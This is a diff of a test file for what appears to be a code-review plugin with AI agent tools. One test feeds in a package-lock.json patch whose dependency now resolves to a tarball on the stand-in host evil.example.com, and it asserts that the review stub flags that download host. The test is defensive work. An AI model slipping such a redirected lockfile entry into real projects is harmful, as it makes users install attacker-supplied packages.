@@ -156,7 +156,7 @@ test("with every toggle off, list_review_files marks no test weakened and the as
   expect(assistantInstructions("pr-1", null, store.getPreferences().preferences)).not.toContain("weakened");
 });
 
-test("with every toggle off, list_review_files and a page's stub show a lockfile without its digest", async () => {
+test("with every toggle off, list_review_files and a page's stub show a lockfile without its digest, the stub naming only a new host", async () => {
   const { bb, harness, store } = host();
   await plugin(bb);
   store.savePatch("pr-1", "diff --git a/package-lock.json b/package-lock.json\n--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1,2 @@\n-    \"node_modules/a\": {\n+    \"node_modules/b\": {\n+      \"resolved\": \"https://evil.example.com/b.tgz\",\n");
@@ -164,8 +164,10 @@ test("with every toggle off, list_review_files and a page's stub show a lockfile
   const listed = JSON.stringify(await harness.behavior.callAgentTool("list_review_files", { targetKey: "pr-1" }, { threadId: "assistant" }));
   const paged = JSON.stringify(await harness.behavior.callAgentTool("read_review_patch", { targetKey: "pr-1" }, { threadId: "assistant" }));
   expect(listed).toContain("package-lock.json · modified");
-  expect(paged).toContain("[lockfile: +2 −1 lines; pass file to read it]");
-  for (const text of [listed, paged]) expect(text).not.toMatch(/packages|evil\.example\.com/);
+  // The agents read the whole lockfile in 0.7.0, so its stub still names where a package now downloads from.
+  expect(paged).toContain("[lockfile: +2 −1 lines; downloads from evil.example.com; pass file to read it]");
+  expect(paged).not.toMatch(/packages/);
+  expect(listed).not.toMatch(/packages|evil\.example\.com/);
 });
 
 test("with Ask why off, a removal takes no reason, and neither the agent nor Settings sees one given while it was on", async () => {
